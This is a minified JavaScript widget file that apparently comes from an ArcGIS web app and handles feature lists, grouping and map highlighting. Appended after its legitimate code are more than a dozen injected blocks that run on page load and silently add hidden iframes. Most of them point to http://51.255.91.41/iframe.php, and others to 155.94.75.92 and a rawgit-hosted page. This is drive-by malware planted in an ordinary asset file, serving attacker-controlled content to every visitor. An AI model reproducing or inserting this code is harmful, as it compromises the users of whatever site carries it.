break;case "DartTheme":b=b.containerNode.parentNode;break;case "TabTheme":b=b.containerNode;break;case "BillboardTheme":b=b.containerNode.parentNode;break;case "FoldableTheme":b=b.containerNode.parentNode.firstChild;break;default:b=this.pageHeader}b=window.getComputedStyle(b,null).getPropertyValue("background-color");this._styleColor=X.fromRgb(b).toHex();for(var e in this.layerList)b=this.layerList[e],"ClusterLayer"===b.type&&b.layerObject.setStyleColor(this._styleColor);this._updateUI(a)}),50)},
_clearMap:function(){if(this.layerList){for(var a in this.layerList){var b=this.layerList[a];if("ClusterLayer"===b.type){var e=!0;"undefined"!==typeof this.continuousRefreshEnabled&&(e=!this.continuousRefreshEnabled);e&&(b.layerObject._clear(),this.map.removeLayer(b.layerObject))}}this.layerList={}}},_close:function(){this.widgetManager.closeWidget(this.id)},onClose:function(){this.inherited(arguments);for(var a in this.layerList){var b=this.layerList[a];b.li&&b.li.orgRenderer&&(b.layerObject.setRenderer?
b.layerObject.setRenderer(b.li.orgRenderer):b.layerObject.setLayerDrawingOptions?b.layerObject.setLayerDrawingOptions([]):console.log("Error re-setting the renderer"),b.layerObject.refresh())}a=!0;"undefined"!==typeof this.config.continuousRefreshEnabled&&(a=!this.config.continuousRefreshEnabled);a&&0!==this.refreshInterval&&(this.refreshIntervalValue=0,clearInterval(this.refreshInterval),this.refreshInterval=0);this.hidePanel||("undefined"!==typeof this.mapExtentChangedHandler?(this.mapExtentChangedHandler.remove(),
this.mapExtentChangedHandler=void 0):"undefined"!==typeof this.iconClickHandler&&(this.iconClickHandler.remove(),this.iconClickHandler=void 0))},_clearChildNodes:function(a){for(;a.hasChildNodes();)a.removeChild(a.lastChild)},_inVisibleRange:function(a,b){var d=!0;a.layerObject&&a.layerObject.hasOwnProperty("visibleAtMapScale")&&(d=a.layerObject.visibleAtMapScale);(a=this.operLayerInfos.getLayerInfoById(b))&&a.isCurrentScaleInTheScaleRange&&(d=a.isCurrentScaleInTheScaleRange());return d},_mapExtentChange:function(){for(var a in this.layerList){var b=
this.layerList[a],e=this._inVisibleRange(b,a);this.showAllFeatures||this._clearList(b);!b.legendOpen||b.groupEnabled&&!b.groupOpen?(b.li&&(b.li.layerListExtentChanged=!0),b.visible&&e?("ClusterLayer"===b.type&&b.layerObject.initalLoad&&this.config.countEnabled&&b.layerObject._updateNode(b.layerObject.node.innerHTML),"ClusterLayer"!==b.type&&("undefined"===typeof b.layerObject?console.log("layer object not known"):this.countFeatures(b))):e||this._updateList([],b.legendNode,b.node,[],!0,b)):b.visible&&
e?(b.updateList=!0,this._loadList(b,b.updateList)):this._updateList([],b.legendNode,b.node,[],!0,b)}},getFeatures:function(a,b,e){var d=a.layerObject,c=a.legendNode,g=a.node,f=!a.listDisabled&&a.legendOpen?!0:!1,k=this._inVisibleRange(d,a.id||a.li.id),l=d&&d.maxRecordCount?d.maxRecordCount:void 0,p,q=[],t=this._getQuery(a,b,f);if(a.visible&&k)if(d.queryFeatures)a.listDisabled||q.push(d.queryFeatures(t)),q.push(d.queryIds(t));else{if(p=a.li.url,-1<p.indexOf("MapServer")||-1<p.indexOf("FeatureServer"))k=
new Z(p),a.listDisabled||q.push(k.execute(t)),q.push(k.executeForIds(t))}else this._updateList([],a.legendNode,a.node,[],!0,a);0<q.length&&C(q).then(h.hitch(this,function(n){var k=a.layerObject.id in this.layerList?a.layerObject.id:a.li.id,m;g&&(m=this.config.countEnabled?g.parentNode:g.previousSibling);n&&1<n.length?(k=n[1])&&l&&k.length>l?this._chunkRequest(d,p,k,l,b,f).then(h.hitch(this,function(d){this._updateList(d,c,g,b,e,a)})):this._updateList(n[0].features,c,g,b,e,a):n&&1===n.length?(this.config.countEnabled&&
(g.innerHTML=w.localizeNumber(n[0].length)),this._removeSearching(k,!1)):(this.config.countEnabled&&(g.innerHTML=w.localizeNumber(0)),this.updateExpand(m,!0),this._removeSearching(k,a.legendOpen))}))},_chunkRequest:function(a,b,e,c,g,n){var d=new J,k=[],l,r;l=0;for(r=e.length;l<r;l+=c){var q=e.slice(l,l+c),p=new f;p.outFields=g;p.objectIds=q;p.returnGeometry=n;a.queryFeatures?k.push(a.queryFeatures(p)):b&&(q=new Z(b),k.push(q.execute(p)))}(new v(k)).then(h.hitch(this,function(a){if(a){for(var b=[],
e=0;e<a.length;e++)a[e][1].features&&b.push.apply(b,a[e][1].features);d.resolve(b)}}));return d},_clearList:function(a){!a.isLoaded&&a.legendNode&&(a.isLoaded=!1,a.legendNode.innerHTML="")},_updateList:function(a,d,e,c,g,f,k){var m=f.li?f.li:f;"ClusterLayer"===f.type&&f.layerObject.node&&b.contains(f.layerObject.node.id,"searching")&&b.remove(f.layerObject.node.id,"searching");var n=f.infoTemplate,r=f.symbolData?f.symbolData.featureDisplayOptions:m&&m.symbolData?m.symbolData.featureDisplayOptions:
{};if(e||d)d&&(f.hasOwnProperty("isLoaded")?!f.isLoaded:1)&&(d.innerHTML=""),g&&e&&this.config.countEnabled&&(e.innerHTML=w.localizeNumber(a.length)),e=this.config.countEnabled?e.parentNode:d.previousSibling,("ClusterLayer"===f.type&&f.visible||"ClusterLayer"!==f.type)&&this.updateExpand(e,0===a.length);if(!k){if(!f.listDisabled&&!f.isLoaded&&0<a.length){k=this.operLayerInfos.getLayerInfoById(f.id);e="ClusterLayer"===f.type?f.layerObject.renderer:k&&k.layerObject&&k.layerObject.renderer?k.layerObject.renderer:
a[0]._graphicsLayer?a[0]._graphicsLayer.renderer:f.layerObject&&f.layerObject.renderer?f.layerObject.renderer:m&&m.renderer?t.fromJson(m.renderer)||m.renderer:f.renderer?t.fromJson(f.renderer)||f.renderer:void 0;g=[];var p=[];k=[];for(var v=0;v<a.length;v++){var u=a[v];"undefined"===typeof u.infoTemplate&&n&&(u.infoTemplate=n);var U=e&&e.getSymbol?e.getSymbol(u):u.symbol?ba.fromJson(u.symbol):void 0,x=u._layer&&u._layer.objectIdField?u._layer.objectIdField:m&&m.oidFieldName&&m.oidFieldName.name?m.oidFieldName.name:
f.layerObject&&f.layerObject.objectIdField?f.layerObject.objectIdField:f&&f.oidFieldName?f.oidFieldName:void 0,z=x?u.attributes[x]:d.id+v,B=this.getDisplayString(u,f,"*"===c[0]?u.attributes:c,r,x,"*"===c[0]?!1:!0),x=B.displayString,M=B.aliasNames,B=B.firstValue,F,K,I,N;if(r.groupEnabled){var D,A,G=void 0;if("undefined"===typeof r.groupByField||r.groupByField)F=r.groupField,D=u.attributes[F.name],N="byField",G=D;else if(F=r.groupByRendererOptions.fields[0],D=u.attributes[F.name],K=r.groupByRendererOptions.values,
N="byRenderer",null!==D&&""!==D){I=0;a:for(;I<K.length;I++){var L=K[I],y=L.value,y=(y=y.split("\x26\x26"))&&1<y.length?D+y[0]+"\x26\x26 "+D+y[1]:isNaN(D)?"'"+D+"'"+L.value:D+L.value;if(eval(y)){A=L;break a}}"undefined"!==typeof A&&null!==A&&(G=A.label.replace(/ /g,""))}K="group_"+m.id+"_"+F.name+"_"+G;var L=!0,J;if(0<g.length)a:for(I=0;I<g.length;I++)if(y=g[I],K===y.id&&("byField"===N&&D===y.value||"byRenderer"===N)){L=!1;J=y.node;I=y.parent;break a}if(L){I=l.create("div",{"class":this.isDartTheme?
"groupItem-dart":"groupItem",id:K+"_c"});var L=l.create("div",{"class":this.isDartTheme?"groupItemTitle-dart":"groupItemTitle",id:K+"_t"},I),y="",O="byRenderer"===N?"":F.name+": ";"undefined"!==typeof M&&M.hasOwnProperty(F.name)&&""!==M[F.name]&&(O="byField"===N?M[F.name]+": ":"");"byField"===N?"undefined"!==typeof F.label&&""!==F.label&&(O=y=F.label+": "):"undefined"!==typeof A?"undefined"!==typeof A.label&&""!==A.label&&(O=y=O+A.label):O=y=O+D;": "===y&&(O=y="");M=D;this._checkDateField(f,F.name)&&
(M=this.formatDateValue(D,F.name,f));var C=this._checkDomainField(f,F.name);C&&(M=this.formatDomainValue(D,C));"byRenderer"===N&&U&&this._createImageDataDiv(h.clone(U),30,30,L,E);l.create("div",{"class":"byField"===N?"groupField":"groupFieldImage",innerHTML:"byField"===N?y+M:y,title:"byField"===N?O+M:O},L);E=!1;f.openGroups&&0<f.openGroups.length&&(E=-1<f.openGroups.indexOf(K));M=this.isDartTheme?" darkThemeColor":" lightThemeColor";M=l.create("div",{"class":this.isDartTheme?"groupCountLabel":"groupCountLabel"+
M},L);L=l.create("div",{"class":this.isDartTheme||this.isDashboardTheme&&!this.isLightTheme?"expandImageContainer-dart":"expandImageContainer"},L);y=this.isDartTheme?"groupItemImageUp-dart":this.isDashboardTheme&&!this.isLightTheme?"groupItemImageUp-dashboard":"groupItemImageUp";O=this.isDartTheme?"groupItemImageDown-dart":this.isDashboardTheme&&!this.isLightTheme?"groupItemImageDown-dashboard":"groupItemImageDown";C=this.isDartTheme?"groupItemImage-dart":this.isDashboardTheme&&!this.isLightTheme?
"groupItemImage-dashboard":"groupItemImage";C+=E?" "+y:" "+O;l.create("div",{"class":C},L);C=this.isDartTheme?"groupItem-dart":"groupItem";C+=f.groupOpen&&E?" groupOn":" groupOff";K=l.create("div",{"class":C,id:K},I);g.push({id:"group_"+m.id+"_"+F.name+"_"+G,node:K,parent:I,value:D});p.push({value:D,node:I,countNode:M,count:1});q(I,"click",h.hitch(this,this._toggleGroup,f))}else p.filter(function(a){if(a.node.id===J.id+"_c")return a})[0].count+=1,K=J}var z=l.create("div",{"class":this.isDartTheme?
"featureItem-dart":"featureItem",id:"feature_"+m.id+"_"+z}),E=!1;m&&m.symbolData&&(E="CustomSymbol"===m.symbolData.symbolType);!U||r.groupEnabled&&"byRenderer"===N||this._createImageDataDiv(h.clone(U),30,30,z,E);q(z,"click",h.hitch(this,this._panToFeature,u));-1<x.indexOf(" - ")&&(x=x.slice(0,-3));l.create("div",{style:"padding: 7px 5px 5px "+(r.groupEnabled&&"byRenderer"===N?"15px":"50px")+"; text-align: "+(window.isRTL?"right":"left")+";",innerHTML:x,title:x},z);k.push({node:z,updateNode:K?K:d,
firstValue:B})}if(0<p.length){a=p.sort(function(a,b){return"undefined"===typeof a.value?b.value:"undefined"===typeof b.value?a.value:isNaN(a.value)?a.value.localeCompare(b.value):parseFloat(a.value)-parseFloat(b.value)});var P=this.config.countEnabled;H.forEach(a,function(a){P&&(a.countNode.innerHTML=w.localizeNumber(a.count));d.appendChild(a.node)})}0<k.length&&(a=k.sort(function(a,b){a=a.firstValue;b=b.firstValue;return"undefined"===typeof a||null===a||""===a?1:"undefined"===typeof b||null===b||
""===b?-1:a===b?0:a.toString().localeCompare(b.toString())}),H.forEach(a,function(a){l.place(a.node,a.updateNode)}))}m.layerListExtentChanged=!1;m=f.layerObject&&f.layerObject.id&&f.layerObject.id in this.layerList?f.layerObject.id:m.id;this.showAllFeatures&&f.visible&&(a=!0,f.layerObject&&"ClusterLayer"===f.type&&(a=!f.layerObject.queryPending,f.layerObject.hasOwnProperty("requiresReload")&&(a=a&&!f.layerObject.requiresReload,f.layerObject.requiresReload=!1)),f.isLoaded=a);this._removeSearching(m,
f.legendOpen)}},updateDomainValues:function(a,b,e,c){var d,f,g,h;for(h in e)g=b?e[h]:h,d=this._checkDomainField(c,g),f=a.attributes[g],d&&(a.attributes[g]=this.formatDomainValue(f,d));return a},updateExpand:function(a,d){if("undefined"!==typeof a){var e;-1<a.id.indexOf("rec_")&&(e=a.id.replace("rec_",""),e=p.byId("exp_"+e));d?(a&&(g.addClass(a,"recDefault"),g.addClass(a,"inActive")),e&&(b.contains(e,"expand-empty")||g.addClass(e,"expandInActive"))):(a&&(g.removeClass(a,"recDefault"),g.removeClass(a,
"inActive")),e&&(b.contains(e,"expand-empty")||g.removeClass(e,"expandInActive")))}},getDisplayString:function(a,b,e,c,f,g){var d="",k={},l="";0<c.fields.length&&H.forEach(c.fields,h.hitch(this,function(c){for(var f in e){var h=g?e[f]:f;if(h===c.name){f=this._checkAliasName(b,h);var n="",r="";"undefined"!==typeof c.label&&(r=c.label,n=""===c.label.trim()?"":": ");c=a.attributes[h];this._checkDateField(b,h)&&(c=this.formatDateValue(c,h,b));var m=this._checkDomainField(b,h);m&&(c=this.formatDomainValue(c,
m));(k[h]=f)&&(h=f);""===l&&(l=c);d+=r+n+c+" - ";break}}}));return{displayString:d,aliasNames:k,firstValue:l}},_getInfoTemplate:function(a){var b=a.infoTemplate;b||(a.layerObject&&a.layerObject.infoTemplate?b=a.layerObject.infoTemplate:a.li&&a.li.infoTemplate&&(b=a.li.infoTemplate));if(!b&&"undefined"!==typeof a.li.subLayerId){var e=a.layerObject.infoTemplates;e&&e.hasOwnProperty(a.li.subLayerId)&&(b=e[a.li.subLayerId].infoTemplate)}return b},formatDomainValue:function(a,b){if(b&&b.codedValues){b=
b.codedValues;for(var d=0;d<b.length;d++){var c=b[d];if(c.code===a)return c.name}}},formatDateValue:function(a,b,c){if(a){var d;if(c=this._getInfoTemplate(c))if(c=c._fieldsMap)for(var e in c)if(c[e].fieldName===b){d=c[e].format;break}"undefined"===typeof d&&(d={dateFormat:"shortDate"});return w.fieldFormatter.getFormattedDate(new Date(a),d)}return""},_checkAliasName:function(a,b){if(a=a.li&&a.li.fields?a.li.fields:a.fields){for(var d=0;d<a.length;d++){var c=a[d];if(c.name===b)return"undefined"!==
typeof c.alias?c.alias:!1}return!1}},_checkDomainField:function(a,b){if(a=a.li&&a.li.fields?a.li.fields:a.fields){for(var d=0;d<a.length;d++){var c=a[d];if(c.name===b)return"undefined"!==typeof c.domain?c.domain:!1}return!1}},_checkDateField:function(a,b){if(a=a.li&&a.li.fields?a.li.fields:a.fields){for(var d=0;d<a.length;d++){var c=a[d];if(c.name===b){if("esriFieldTypeDate"===c.type)return!0;break}}return!1}},_checkDisplayField:function(a,b){var d=!0;if(a)for(var c=0;c<a.length;c++){if(a[c].name===
b)return a[c];d=!1}return d},flashGraphics:function(a){for(var b=0;b<a.length;b++)this._flashFeature(a[b])},_flashFeature:function(a){var b;if(a.geometry){var c=X.fromHex(this._styleColor),f=h.clone(c);f.a=.4;switch(a.geometry.type){case "point":b=new E(E.STYLE_CIRCLE,15,new A(A.STYLE_SOLID,c,1),f);break;case "polyline":b=new A(A.STYLE_SOLID,c,3);break;case "polygon":b=new P(P.STYLE_DIAGONAL_CROSS,new A(A.STYLE_SOLID,c,2),f)}}a=new u(a.geometry,b);this.map.graphics.add(a);if(b=a.getDojoShape())x.animateStroke({shape:b,
duration:900,color:{start:b.strokeStyle.color,end:b.strokeStyle.color},width:{start:25,end:0}}).play(),setTimeout(this._clearFeature,1075,a)},_clearFeature:function(a){a.getLayer().remove(a)},_panToFeature:function(a){if(a.geometry){var b=a.geometry;if("polyline"===b.type)var c=b.paths[Math.ceil(b.paths.length/2)-1],c=c[Math.ceil((c.length-1)/2)],b=new W(c[0],c[1],b.spatialReference);"point"!==b.type&&(b=b.getExtent().getCenter());this._pan(a,b).then(h.hitch(this,function(){this._flashFeature(a);
if(a._layer&&a._layer.infoTemplate||a.infoTemplate)this.map.infoWindow.setFeatures([a]),this.map.infoWindow.select(0),this.map.infoWindow.show(b)}))}},_pan:function(a,b){var c=new J;this.showAllFeatures&&!this.map.extent.contains(a.geometry)?this.map.centerAt(b).then(function(a){c.resolve(a)}):c.resolve(void 0);return c},_getQuery:function(a,b,c){var d=a.layerObject,e=new f;e.geometry=this.showAllFeatures?null:this.map.extent;e.outFields=b;e.returnGeometry=c;b=["collection","kml","geo_rss"];a.selfType&&
-1<b.indexOf(a.selfType)||!d.url?this.showAllFeatures&&d&&d.fullExtent&&(e.geometry=d.fullExtent):e.where=a.filter?a.filter:"1\x3d1";return e},countFeatures:function(a){if(!this.hidePanel){var b=a.layerObject,c=this.config.countEnabled?a.node:a.legendNode,f=this._getQuery(a);b.queryCount&&b.visible?b.queryCount(f,h.hitch(this,function(a){if(c){var b;this.config.countEnabled?(c.innerHTML=w.localizeNumber(a),b=c.parentNode):b=c.previousSibling;this.updateExpand(b,0===a)}})):a&&a.li&&a.li.url&&(a=a.li.url,
(-1<a.indexOf("MapServer")||-1<a.indexOf("FeatureServer"))&&(new Z(a)).executeForIds(f).then(h.hitch(this,function(a){if(c){var b=a?a.length:0;this.config.countEnabled?(c.innerHTML=w.localizeNumber(b),a=c.parentNode):a=c.previousSibling;this.updateExpand(a,0===b)}})))}}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});